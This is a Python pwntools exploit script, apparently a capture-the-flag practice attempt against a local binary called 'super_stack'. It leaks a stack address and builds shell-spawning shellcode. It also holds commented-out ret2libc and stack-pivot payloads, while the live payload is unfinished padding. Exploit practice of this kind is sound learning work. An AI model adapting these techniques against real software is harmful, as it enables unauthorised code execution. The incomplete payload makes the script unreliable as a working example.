#!/usr/bin/env python3
from pwn import *
import sys

binary = "./super_stack"
elf = context.binary = ELF(binary, False)

#context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

#### GDB Script
script = '''
b *0x8049243
c
'''


io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)


def main():
    global io
    #################### 
    ### EXPLOIT CODE ###
    ####################
    
    io = start()
    ret = 0x0804900e # ret gadget
    ru("buf: ")
    leak = int(rl(), 16)
    
    log.success(f"BUFFER LEAK : {hex(leak)}")
    
    shellcode = asm(shellcraft.sh())
    shell_len = len(shellcode)

    #offset =  108 + 4# get correct offset
    #payload = flat(
    #    #cyclic(offset),
    #    b'\x90'*10,
    #    shellcode,
    #    cyclic((offset - (shell_len + 10))),
    #    #ret,
    #    leak
    #)

    libc.address = 0xf7d7c000
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']


    # stack pivoting
    #payload = flat(
    #    0x0,
    #    system,
    #    0x08049022, # pop_ebx
    #    binsh,
    #    cyclic((108 - (4*4))),
    #    leak,
    #    0x08049145, # leave; ret
    #)

    #offset = 48
    #payload = flat(
    #    cyclic(48),
    #    system,
    #    0x08049022, # pop_ebx
    #    binsh,
    #)

    payload = flat(
        cyclic(184),
        
    )

    s(payload)
    #rl()
    ia()



    '''
    # 184 to esp 
    stack pointer
     0xffffcfcc
    '''

    




if __name__ == "__main__":
    main()

